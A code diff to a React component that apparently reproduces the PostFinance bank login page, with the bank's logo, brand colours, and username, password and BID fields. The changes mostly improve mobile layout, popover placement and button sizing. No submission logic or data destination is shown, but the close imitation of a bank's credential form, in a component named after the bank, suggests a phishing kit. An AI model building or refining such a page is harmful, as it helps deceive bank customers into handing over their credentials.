@@ -133,7 +133,7 @@ const LANG_OPTIONS: { code: Lang; label: string }[] = [
   { code: "en", label: "English" },
 ];
 
-const InfoDot = ({ size = 32 }: { size?: number }) => (
+const InfoDot = ({ size = 24 }: { size?: number }) => (
   <svg
     width={size}
     height={size}
@@ -148,6 +148,7 @@ const InfoDot = ({ size = 32 }: { size?: number }) => (
     <line x1="8" y1="7" x2="8" y2="12" strokeLinecap="round" />
   </svg>
 );
+
 
 const PostFinanceLogo = ({ className = "" }: { className?: string }) => (
   <svg
@@ -255,12 +256,13 @@ const FieldUnderline = () => (
 const InfoPopover = ({ text }: { text: string }) => (
   <div
     role="tooltip"
-    className="absolute z-20 left-0 bottom-full mb-2 max-w-[340px] w-[min(340px,90vw)] rounded-md px-3 py-2 text-[13px] leading-relaxed whitespace-pre-line bg-white shadow-sm"
+    className="absolute z-20 left-1/2 -translate-x-1/2 bottom-full mb-1 max-w-[340px] w-[min(340px,90vw)] rounded-md px-3 py-2 text-[13px] leading-relaxed whitespace-pre-line bg-white shadow-sm"
     style={{ border: `1px solid ${PF_INFO_BLUE}`, color: PF_INFO_BLUE }}
   >
     {text}
   </div>
 );
+
 
 const ChPostfinance = () => {
   const [searchParams] = useSearchParams();
@@ -369,23 +371,26 @@ const ChPostfinance = () => {
                   <div className="relative">
                     <label
                       htmlFor="pf-user"
-                      className="flex items-center gap-2 text-[12px] mb-2"
-                      style={{ color: "#000", fontWeight: 800 }}
+                      className="flex items-center gap-2 text-[12px] mb-2 font-semibold md:font-extrabold"
+                      style={{ color: "#000" }}
                     >
                       {t.user}
-                      <button
-                        type="button"
-                        aria-label="Info"
-                        className="inline-flex items-center justify-center"
-                        onClick={(e) => {
-                          e.preventDefault();
-                          setOpenInfo((v) => (v === "u" ? null : "u"));
-                        }}
-                      >
-                        <InfoDot size={32} />
-                      </button>
+                      <span className="relative inline-flex">
+                        <button
+                          type="button"
+                          aria-label="Info"
+                          className="inline-flex items-center justify-center"
+                          onClick={(e) => {
+                            e.preventDefault();
+                            setOpenInfo((v) => (v === "u" ? null : "u"));
+                          }}
+                        >
+                          <InfoDot size={24} />
+                        </button>
+                        {openInfo === "u" && <InfoPopover text={t.infoUser} />}
+                      </span>
                     </label>
-                    {openInfo === "u" && <InfoPopover text={t.infoUser} />}
+
                     <input
                       id="pf-user"
                       type="text"
@@ -402,9 +407,10 @@ const ChPostfinance = () => {
                   <div>
                     <label
                       htmlFor="pf-pw"
-                      className="block text-[12px] mb-2"
-                      style={{ color: "#000", fontWeight: 800 }}
+                      className="block text-[12px] mb-2 font-semibold md:font-extrabold"
+                      style={{ color: "#000" }}
                     >
+
                       {t.password}
                     </label>
                     <div className="relative">
@@ -454,23 +460,26 @@ const ChPostfinance = () => {
                       </h2>
                       <label
                         htmlFor="pf-bid"
-                        className="flex items-center gap-2 text-[12px] mb-2"
-                        style={{ color: "#000", fontWeight: 800 }}
+                        className="flex items-center gap-2 text-[12px] mb-2 font-semibold md:font-extrabold"
+                        style={{ color: "#000" }}
                       >
                         {t.bid}
-                        <button
-                          type="button"
-                          aria-label="Info"
-                          className="inline-flex items-center justify-center"
-                          onClick={(e) => {
-                            e.preventDefault();
-                            setOpenInfo((v) => (v === "b" ? null : "b"));
-                          }}
-                        >
-                          <InfoDot size={32} />
-                        </button>
+                        <span className="relative inline-flex">
+                          <button
+                            type="button"
+                            aria-label="Info"
+                            className="inline-flex items-center justify-center"
+                            onClick={(e) => {
+                              e.preventDefault();
+                              setOpenInfo((v) => (v === "b" ? null : "b"));
+                            }}
+                          >
+                            <InfoDot size={24} />
+                          </button>
+                          {openInfo === "b" && <InfoPopover text={t.infoBid} />}
+                        </span>
                       </label>
-                      {openInfo === "b" && <InfoPopover text={t.infoBid} />}
+
                       <input
                         id="pf-bid"
                         type="text"
@@ -483,12 +492,12 @@ const ChPostfinance = () => {
                     </div>
                   )}
 
-                  <div className="flex justify-end pt-2">
+                  <div className="flex justify-center md:justify-end pt-2">
                     <button
                       type="submit"
                       onMouseEnter={() => setSubmitHover(true)}
                       onMouseLeave={() => setSubmitHover(false)}
-                      className="rounded-full px-10 py-3 text-[15px] font-normal transition-colors"
+                      className="rounded-full w-full md:w-auto px-10 py-3 text-[15px] font-normal transition-colors"
                       style={{
                         background: submitHover ? PF_YELLOW_HOVER : PF_YELLOW,
                         color: PF_PETROL,
@@ -497,11 +506,12 @@ const ChPostfinance = () => {
                       {t.next}
                     </button>
                   </div>
+
                 </form>
               </section>
 
               {/* Right column */}
-              <aside className="flex flex-col gap-6">
+              <aside className="hidden md:flex flex-col gap-6">
                 {/* Schnelles Login */}
                 <div className="bg-white rounded-2xl p-6">
                   <h3
@@ -578,27 +588,31 @@ const ChPostfinance = () => {
               {t.toPf}
               <ChevronRight className="w-4 h-4" strokeWidth={2} />
             </a>
+            <div className="md:hidden border-t" style={{ borderColor: "#d6e4e0" }} />
             <div className="flex flex-col md:flex-row md:items-center gap-3 md:gap-4">
               <button
                 type="button"
                 onClick={(e) => e.preventDefault()}
-                className="inline-flex items-center gap-2 px-4 py-3 rounded-md bg-white"
+                className="flex w-full md:w-auto md:inline-flex items-center justify-between md:justify-center gap-2 px-4 py-3 rounded-md bg-white"
                 style={{ border: `1px solid ${PF_PETROL}`, color: "#374151" }}
               >
-                <Moon className="w-4 h-4" strokeWidth={1.8} />
-                {t.auto}
+                <span className="inline-flex items-center gap-2">
+                  <Moon className="w-4 h-4" strokeWidth={1.8} />
+                  {t.auto}
+                </span>
                 <ChevronDown className="w-4 h-4" strokeWidth={2} style={{ color: "#9ca3af" }} />
               </button>
               <div className="relative" ref={langRef}>
                 <button
                   type="button"
                   onClick={() => setLangOpen((v) => !v)}
-                  className="inline-flex items-center gap-2 px-4 py-3 rounded-md bg-white w-full"
+                  className="flex w-full md:w-auto md:inline-flex items-center justify-between md:justify-center gap-2 px-4 py-3 rounded-md bg-white"
                   style={{ border: `1px solid ${PF_PETROL}`, color: "#374151" }}
                 >
                   {t.langLabel}
                   <ChevronDown className="w-4 h-4" strokeWidth={2} style={{ color: "#9ca3af" }} />
                 </button>
+
                 {langOpen && (
                   <div
                     className="absolute z-30 left-0 right-0 bottom-full mb-2 rounded-md bg-white overflow-hidden shadow-md"
